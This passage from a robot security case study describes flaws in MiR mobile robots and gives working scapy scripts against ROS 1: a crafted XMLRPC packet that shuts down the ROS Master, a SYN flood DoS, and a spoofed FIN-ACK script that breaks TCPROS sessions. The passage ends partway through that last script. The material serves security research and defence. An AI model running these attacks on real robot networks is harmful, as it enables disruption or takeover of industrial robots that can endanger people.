    <p>Out of the wired and wireless interfaces within MiR100, MiR200 and other vehicles from the MiR fleet, it’s possible to access the Control Dashboard on a hardcoded IP address. Credentials to such wireless interface default to well known and widely spread users (omitted) and passwords (omitted). This information is also available in past User Guides and manuals which the vendor distributed. This flaw allows cyber attackers to take control of the robot remotely and make use of the default user interfaces MiR has created, <strong>lowering the complexity of attacks and making them available to entry-level attackers.</strong> More elaborated attacks can also be established by clearing authentication and sending network requests directly. We have confirmed this flaw in MiR100 and MiR200 but according to the vendor, it might also apply to MiR250, MiR500 and MiR1000.</p>
    <p><a href="https://asciinema.org/a/dE9TfluHMWejpMVk0Zv3mpVtR"><img src="https://asciinema.org/a/dE9TfluHMWejpMVk0Zv3mpVtR.svg" alt="asciicast" /></a></p>
    <p><a href="https://www.youtube.com/watch?v=E4MzhkIdkn8"><img src="https://img.youtube.com/vi/E4MzhkIdkn8/0.jpg" /></a></p>
    <h4 id="mir-rest-api-allows-for-data-exfiltration-by-unauthorized-attackers-e.g.-indoor-maps">MiR REST API allows for data exfiltration by unauthorized attackers (e.g. indoor maps</h4>
    <p>The access tokens for the REST API are directly derived (sha256 and base64 encoding) from the publicly available default credentials from the Control Dashboard (refer to CVE-2020-10270 for related flaws). This flaw in combination with CVE-2020-10273 allows any attacker connected to the robot networks (wired or wireless) to exfiltrate all stored data (e.g. indoor mapping images) and associated metadata from the robot’s database.</p>
    <p><a href="https://asciinema.org/a/UBJ4l23a1ibnGWiMDPnasSub5"><img src="https://asciinema.org/a/UBJ4l23a1ibnGWiMDPnasSub5.svg" alt="asciicast" /></a></p>
    <p><a href="https://www.youtube.com/watch?v=E4OCFmDXXqs"><img src="https://img.youtube.com/vi/E4OCFmDXXqs/0.jpg" /></a></p>
    <h4 id="mir-ros-computational-graph-is-exposed-to-all-network-interfaces-including-poorly-secured-wireless-networks-and-open-wired-ones">MiR ROS computational graph is exposed to all network interfaces, including poorly secured wireless networks and open wired ones</h4>
    <p>MiR100, MiR200 and other MiR robots use the Robot Operating System (ROS) default packages exposing the computational graph to all network interfaces, wireless and wired. This is the result of a bad set up and can be mitigated by appropriately configuring ROS and/or applying custom patches as appropriate. Currently, the ROS computational graph can be accessed fully from the wired exposed ports. In combination with other flaws such as CVE-2020-10269, the computation graph can also be fetched and interacted from wireless networks. This allows a malicious operator to take control of the ROS logic and correspondingly, the complete robot given that MiR’s operations are centered around the framework (ROS).</p>
    <p><a href="https://asciinema.org/a/zZcMkxRHPdgXAEcyQEdHH2hzn"><img src="https://asciinema.org/a/zZcMkxRHPdgXAEcyQEdHH2hzn.svg" alt="asciicast" /></a></p>
    <p><a href="https://www.youtube.com/watch?v=SNiz76i4RDc"><img src="https://img.youtube.com/vi/SNiz76i4RDc/0.jpg" /></a></p>
    <h2 id="robot-operating-system-ros-1">Robot Operating System (ROS 1)</h2>
    <p>The Robot Operating System (ROS) is the de <em>facto</em> standard for robot application development <span class="citation" data-cites="Quigley09">(<a href="#ref-Quigley09" role="doc-biblioref">Quigley, Gerkey, et al. 2009</a>)</span>. It’s a framework for creating robot behaviors that comprises various stacks and capabilities for message passing, perception, navigation, manipulation or security, among others. It’s <a href="https://www.businesswire.com/news/home/20190516005135/en/Rise-ROS-55-total-commercial-robots-shipped">estimated</a> that by 2024, 55% of the total commercial robots will be shipping at least one ROS package. <strong>ROS is to roboticists what Linux is to computer scientists</strong>.</p>
    <p>This case study will analyze the security of ROS and demonstrate a few security flaws that made the community jump into a more robust evolution: ROS 2<span class="sidenote-wrapper"><label for="sn-17" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-17" class="margin-toggle"/><span class="sidenote">Official e-manual of TB3 http://emanual.robotis.com/docs/en/platform/turtlebot3/overview/<br />
    <br />
    </span></span> (see <a href="../2_ros2/">case study on ROS 2</a>)</p>
    <h3 id="dissecting-ros-network-interactions-through-scapy">Dissecting ROS network interactions through scapy</h3>
    <p>TCPROS is a transport layer for ROS Messages and Services. It uses standard TCP/IP sockets for transporting message data. Inbound connections are received via a TCP Server Socket with a header containing message data type and routing information. This class focuses on capturing the ROS Slave API.</p>
    <p>Until it gets merged upstream (see <a href="https://github.com/secdev/scapy/pull/3462">TCPROS PR</a>), you can get the TCPROS dissector as follows:</p>
    <div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip3</span> install git+https://github.com/vmayoral/scapy@tcpros</span></code></pre></div>
    <p>An example package is presented below:</p>
    <p><img src="../../images/2021/ros_shutdown.png" /></p>
    <div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.contrib.tcpros <span class="im">import</span> <span class="op">*</span></span>
    <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>bind_layers(TCP, TCPROS)</span>
    <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>bind_layers(HTTPRequest, XMLRPC)</span>
    <span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>bind_layers(HTTPResponse, XMLRPC)</span>
    <span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>pkt <span class="op">=</span>   <span class="st">b&quot;POST /RPC2 HTTP/1.1</span><span class="ch">\r\n</span><span class="st">Accept-Encoding: gzip</span><span class="ch">\r\n</span><span class="st">Content-Length: &quot;</span> \</span>
    <span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;227</span><span class="ch">\r\n</span><span class="st">Content-Type: text/xml</span><span class="ch">\r\n</span><span class="st">Host: 12.0.0.2:11311</span><span class="ch">\r\n</span><span class="st">User-Agent:&quot;</span> \</span>
    <span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;xmlrpclib.py/1.0.1 (by www.pythonware.com)</span><span class="ch">\r\n\r\n</span><span class="st">&lt;?xml version=&quot;</span> \</span>
    <span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;&#39;1.0&#39;?&gt;</span><span class="ch">\n</span><span class="st">&lt;methodCall&gt;</span><span class="ch">\n</span><span class="st">&lt;methodName&gt;shutdown&lt;/methodName&gt;</span><span class="ch">\n</span><span class="st">&lt;params&gt;&quot;</span> \</span>
    <span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;/rosparam-92418&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&quot;</span> \</span>
    <span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;BOOM&lt;/string&gt;&lt;/value&gt;&quot;</span> \</span>
    <span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>        <span class="st">b&quot;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;/params&gt;</span><span class="ch">\n</span><span class="st">&lt;/methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span></span>
    <span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> TCPROS(pkt)</span></code></pre></div>
    <p>or alternatively, crafting it layer by layer:</p>
    <div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> (</span>
    <span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>    IP(version<span class="op">=</span><span class="dv">4</span>, ihl<span class="op">=</span><span class="dv">5</span>, tos<span class="op">=</span><span class="dv">0</span>, flags<span class="op">=</span><span class="dv">2</span>, dst<span class="op">=</span><span class="st">&quot;12.0.0.2&quot;</span>)</span>
    <span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> TCP(</span>
    <span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>        sport<span class="op">=</span><span class="dv">20001</span>,</span>
    <span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>        dport<span class="op">=</span><span class="dv">11311</span>,</span>
    <span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a>        seq<span class="op">=</span><span class="dv">1</span>,</span>
    <span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>        flags<span class="op">=</span><span class="st">&quot;PA&quot;</span>,</span>
    <span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>        ack<span class="op">=</span><span class="dv">1</span>,</span>
    <span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> TCPROS()</span>
    <span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> HTTP()</span>
    <span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> HTTPRequest(</span>
    <span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>        Accept_Encoding<span class="op">=</span><span class="st">b&quot;gzip&quot;</span>,</span>
    <span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>        Content_Length<span class="op">=</span><span class="st">b&quot;227&quot;</span>,</span>
    <span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>        Content_Type<span class="op">=</span><span class="st">b&quot;text/xml&quot;</span>,</span>
    <span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a>        Host<span class="op">=</span><span class="st">b&quot;12.0.0.2:11311&quot;</span>,</span>
    <span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>        User_Agent<span class="op">=</span><span class="st">b&quot;xmlrpclib.py/1.0.1 (by www.pythonware.com)&quot;</span>,</span>
    <span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>        Method<span class="op">=</span><span class="st">b&quot;POST&quot;</span>,</span>
    <span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>        Path<span class="op">=</span><span class="st">b&quot;/RPC2&quot;</span>,</span>
    <span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>        Http_Version<span class="op">=</span><span class="st">b&quot;HTTP/1.1&quot;</span>,</span>
    <span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> XMLRPC()</span>
    <span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> XMLRPCCall(</span>
    <span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a>        version<span class="op">=</span><span class="st">b&quot;&lt;?xml version=&#39;1.0&#39;?&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>        methodcall_opentag<span class="op">=</span><span class="st">b&quot;&lt;methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a>        methodname_opentag<span class="op">=</span><span class="st">b&quot;&lt;methodName&gt;&quot;</span>,</span>
    <span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a>        methodname<span class="op">=</span><span class="st">b&quot;shutdown&quot;</span>,</span>
    <span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>        methodname_closetag<span class="op">=</span><span class="st">b&quot;&lt;/methodName&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a>        params_opentag<span class="op">=</span><span class="st">b&quot;&lt;params&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a>        params<span class="op">=</span><span class="st">b&quot;&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;/rosparam-92418&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&lt;param&gt;</span><span class="ch">\n</span><span class="st">&lt;value&gt;&lt;string&gt;BOOM&lt;/string&gt;&lt;/value&gt;</span><span class="ch">\n</span><span class="st">&lt;/param&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>        params_closetag<span class="op">=</span><span class="st">b&quot;&lt;/params&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>        methodcall_closetag<span class="op">=</span><span class="st">b&quot;&lt;/methodCall&gt;</span><span class="ch">\n</span><span class="st">&quot;</span>,</span>
    <span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a>    )</span>
    <span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>)</span></code></pre></div>
    <p>This package will invoke the <code>shutdown</code> method of ROS 2 Master, shutting it down, together with all its associated Nodes.</p>
    <p>Let’s take a look at other potential attacks against ROS.</p>
    <h3 id="syn-ack-dos-flooding-attack-for-ros">SYN-ACK DoS flooding attack for ROS</h3>
    <p>A SYN flood is a type of OSI Level 4 (Transport Layer) network attack. The basic idea is to keep a server busy with idle connections, resulting in a a Denial-of-Service (DoS) via a maxed-out number of connections. Roughly, the attack works as follows:</p>
    <ul>
    <li>the client sends a TCP <code>SYN</code> (<code>S</code> flag) packet to begin a connection with a given end-point (e.g. a server).</li>
    <li>the server responds with a <code>SYN-ACK</code> packet, particularly with a TCP <code>SYN-ACK</code> (<code>SA</code> flag) packet.</li>
    <li>the client responds back with an <code>ACK</code> (flag) packet. In normal operation, the client should send an <code>ACK</code> packet followed by the data to be transferred, or a <code>RST</code> reply to reset the connection. On the target server, the connection is kept open, in a <code>SYN_RECV</code> state, as the <code>ACK</code> packet may have been lost due to network problems.</li>
    <li>In the attack, to abuse this handshake process, an attacker can send a <em>SYN Flood</em>, a flood of <code>SYN</code> packets, and do nothing when the server responds with a <code>SYN-ACK</code> packet. The server politely waits for the other end to respond with an <code>ACK</code> packet, and because bandwidth is fixed, the hardware only has a fixed number of connections it can make. Eventually, the SYN packets max out the available connections to a server with hanging connections. New sockets will experience a denial of service.</li>
    </ul>
    <p>A proof-of-concept attack was developed on the simulated target scenario (above) to isolate communications. The attack exploit is displayed below:</p>
    <div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">&quot;Capturing network traffic...&quot;</span>)</span>
    <span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>packages <span class="op">=</span> sniff(iface<span class="op">=</span><span class="st">&quot;eth0&quot;</span>, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;tcp&quot;</span>, count<span class="op">=</span><span class="dv">20</span>)</span>
    <span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>targets <span class="op">=</span> {}</span>
    <span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> p <span class="kw">in</span> packages[TCPROSBody]:</span>
    <span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Filter by ip</span></span>
    <span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>    <span class="co"># if p[IP].src == &quot;12.0.0.2&quot;:</span></span>
    <span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>    port <span class="op">=</span> p.sport</span>
    <span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>    ip <span class="op">=</span> p[IP].src</span>
    <span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ip <span class="kw">in</span> targets.keys():</span>
    <span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a>        targets[ip].append(port)</span>
    <span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
    <span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>        targets[ip] <span class="op">=</span> [port]</span>
    <span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Get unique values:</span></span>
    <span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> t <span class="kw">in</span> targets.keys():</span>
    <span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>    targets[t] <span class="op">=</span> <span class="bu">list</span>(<span class="bu">set</span>(targets[t]))</span>
    <span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Select one of the targets</span></span>
    <span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>dst_target <span class="op">=</span> <span class="bu">list</span>(<span class="bu">map</span>(itemgetter(<span class="dv">0</span>), targets.items()))[<span class="dv">0</span>]</span>
    <span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>dport_target <span class="op">=</span> targets[dst_target]</span>
    <span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a><span class="co"># Small fix to meet scapy syntax on &quot;dport&quot; key</span></span>
    <span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a><span class="co">#  if single value, can&#39;t go as a list</span></span>
    <span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="bu">len</span>(dport_target) <span class="op">&lt;</span> <span class="dv">2</span>:</span>
    <span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>    dport_target <span class="op">=</span> dport_target[<span class="dv">0</span>]</span>
    <span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>p<span class="op">=</span>IP(dst<span class="op">=</span>dst_target,<span class="bu">id</span><span class="op">=</span><span class="dv">1111</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">/</span>TCP(sport<span class="op">=</span>RandShort(),dport<span class="op">=</span>dport_target,seq<span class="op">=</span><span class="dv">1232345</span>,ack<span class="op">=</span><span class="dv">10000</span>,window<span class="op">=</span><span class="dv">10000</span>,flags<span class="op">=</span><span class="st">&quot;S&quot;</span>)<span class="op">/</span><span class="st">&quot;SYN Flood DoS&quot;</span></span>
    <span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>ls(p)</span>
    <span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>ans,unans<span class="op">=</span>srloop(p,inter<span class="op">=</span><span class="fl">0.05</span>,retry<span class="op">=</span><span class="dv">2</span>,timeout<span class="op">=</span><span class="dv">4</span>)</span></code></pre></div>
    <p>In many systems, attacker would find no issues executing this attack and would be able to bring down ROSTCP interactions if the target machine’s networking stack isn’t properly configured. To defend against this attack, a user would need to set up their kernel’s network stack appropriately. In particular, they’d need to ensure that <code>TCP SYN cookies</code> are enabled. <code>SYN cookies</code> work by not using the <code>SYN</code> queue at all. Instead, the kernel simply replies to the <code>SYN</code> with a <code>SYN-ACK</code>, but will include a specially crafted TCP sequence number that encodes the source and destination IP address, port number and the time the packet was sent. A legitimate connection would send the <code>ACK</code> packet of the three way handshake with the specially crafted sequence number. This allows the system to verify that it has received a valid response to a <code>SY cookie</code> and allow the connection, even though there is no corresponding <code>SYN</code> in the queue.</p>
    <h3 id="fin-ack-flood-attack-targeting-ros">FIN-ACK flood attack targeting ROS</h3>
    <p>The previous <code>SYN-ACK</code> DoS flooding attack did not affect hardened control stations because it is blocked by <code>SYN cookies</code> at the Linux kernel level. I dug a bit further and looked for alternatives to disrupt ROS-Industrial communications, even in in the presence of hardening (at least to the best of my current knowledge).</p>
    <p>After testing a variety of attacks against the ROS-Industrial network including <code>ACK and PUSH ACK</code> flooding, <code>ACK Fragmentation</code> flooding or <code>Spoofed Session</code> flooding among others, assuming the role of an attacker I developed a valid disruption proof-of-concept using the <code>FIN-ACK</code> attack. Roughly, soon after a successful three or four-way <code>TCP-SYN</code> session is established, the <code>FIN-ACK</code> attack sends a <code>FIN</code> packet to close the <code>TCP-SYN</code> session between a host and a client machine. Given a <code>TCP-SYN</code> session established by ROSTCP between two entities wherein one is relying information of the robot to the other (running the ROS master) for coordination, the <code>FIN-ACK</code> flood attack sends a large number of spoofed <code>FIN</code> packets that do not belong to any session on the target server. The attack has two consequences: first, it tries to exhaust a recipient’s resources – its RAM, CPU, etc. as the target tries to process these invalid requests. Second, the communication is being constantly finalized by the attacker which leads to ROS messages being lost in the process, leading to the potential loss of relevant data or a significant lowering of the reception rate which might affect the performance of certain robotic algorithms.</p>
    <p>The following script displays the simple proof-of-concept developed configured for validating the attack in the simplified isolated scenario.</p>
    <div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> tcpros_fin_ack():</span>
    <span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">&quot;&quot;&quot;</span></span>
    <span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="co">    crafting a FIN ACK interrupting publisher&#39;s comms</span></span>
    <span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="co">    &quot;&quot;&quot;</span></span>
    <span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    flag_valid <span class="op">=</span> <span class="va">True</span></span>
    <span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>    targetp <span class="op">=</span> <span class="va">None</span></span>
    <span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    targetp_ack <span class="op">=</span> <span class="va">None</span></span>
    <span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># fetch 10 tcp packages</span></span>
    <span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> flag_valid:</span>
    <span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        packages <span class="op">=</span> sniff(iface<span class="op">=</span><span class="st">&quot;eth0&quot;</span>, <span class="bu">filter</span><span class="op">=</span><span class="st">&quot;tcp&quot;</span>, count<span class="op">=</span><span class="dv">4</span>)</span>
    <span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="bu">len</span>(packages[TCPROSBody]) <span class="op">&lt;</span> <span class="dv">1</span>:</span>
    <span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
    <span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
    <span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>            <span class="co"># find first TCPROSBody and pick a target</span></span>
    <span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>            targetp <span class="op">=</span> packages[TCPROSBody][<span class="op">-</span><span class="dv">1</span>]  <span class="co"># pick latest instance</span></span>
    <span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>            index <span class="op">=</span> packages.index(packages[TCPROSBody][<span class="op">-</span><span class="dv">1</span>])</span>
    <span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(index <span class="op">+</span> <span class="dv">1</span>, <span class="bu">len</span>(packages)):</span>
    <span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>                targetp_ack <span class="op">=</span> packages[i]</span>
    <span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>                <span class="co"># check if the ack matches appropriately</span></span>
    <span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> targetp[IP].src <span class="op">==</span> targetp_ack[IP].dst <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>                        targetp[IP].dst <span class="op">==</span> targetp_ack[IP].src <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].sport <span class="op">==</span> targetp_ack[TCP].dport <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].dport <span class="op">==</span> targetp_ack[TCP].sport <span class="kw">and</span> <span class="op">\</span></span>
    <span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>                        targetp[TCP].ack <span class="op">==</span> targetp_ack[TCP].seq:</span>
    <span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>                    flag_valid <span class="op">=</span> <span class="va">False</span></span>
    <span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>                    <span class="cf">break</span></span>
    <span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="kw">not</span> flag_valid <span class="kw">and</span> targetp_ack <span class="kw">and</span> targetp:</span>
    <span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Option 2</span></span>
    <span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>        p_attack <span class="op">=</span>IP(src<span class="op">=</span>targetp[IP].src, dst<span class="op">=</span>targetp[IP].dst,<span class="bu">id</span><span class="op">=</span>targetp[IP].<span class="bu">id</span> <span class="op">+</span> <span class="dv">1</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">\</span></span>
    <span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a>            <span class="op">/</span>TCP(sport<span class="op">=</span>targetp[TCP].sport,dport<span class="op">=</span>targetp[TCP].dport,flags<span class="op">=</span><span class="st">&quot;FA&quot;</span>, seq<span class="op">=</span>targetp_ack[TCP].ack,</span>
    <span id="cb15-32"><a href="#cb15-32" aria-hidden="true" tabindex="-1"></a>            ack<span class="op">=</span>targetp_ack[TCP].seq)</span>
    <span id="cb15-33"><a href="#cb15-33" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb15-34"><a href="#cb15-34" aria-hidden="true" tabindex="-1"></a>        ans <span class="op">=</span> sr1(p_attack, retry<span class="op">=</span><span class="dv">0</span>, timeout<span class="op">=</span><span class="dv">1</span>)</span>
    <span id="cb15-35"><a href="#cb15-35" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb15-36"><a href="#cb15-36" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> ans <span class="kw">and</span> <span class="bu">len</span>(ans) <span class="op">&gt;</span> <span class="dv">0</span> <span class="kw">and</span> ans[TCP].flags <span class="op">==</span> <span class="st">&quot;FA&quot;</span>:</span>
    <span id="cb15-37"><a href="#cb15-37" aria-hidden="true" tabindex="-1"></a>            p_ack <span class="op">=</span>IP(src<span class="op">=</span>targetp[IP].src, dst<span class="op">=</span>targetp[IP].dst,<span class="bu">id</span><span class="op">=</span>targetp[IP].<span class="bu">id</span> <span class="op">+</span> <span class="dv">1</span>,ttl<span class="op">=</span><span class="dv">99</span>)<span class="op">\</span></span>
    <span id="cb15-38"><a href="#cb15-38" aria-hidden="true" tabindex="-1"></a>                <span class="op">/</span>TCP(sport<span class="op">=</span>targetp[TCP].sport,dport<span class="op">=</span>targetp[TCP].dport,flags<span class="op">=</span><span class="st">&quot;A&quot;</span>, seq<span class="op">=</span>ans[TCP].ack,</span>
    <span id="cb15-39"><a href="#cb15-39" aria-hidden="true" tabindex="-1"></a>                ack<span class="op">=</span>ans[TCP].seq <span class="op">+</span> <span class="dv">1</span>)</span>
    <span id="cb15-40"><a href="#cb15-40" aria-hidden="true" tabindex="-1"></a>            send(p_ack)</span>
    <span id="cb15-41"><a href="#cb15-41" aria-hidden="true" tabindex="-1"></a></span>
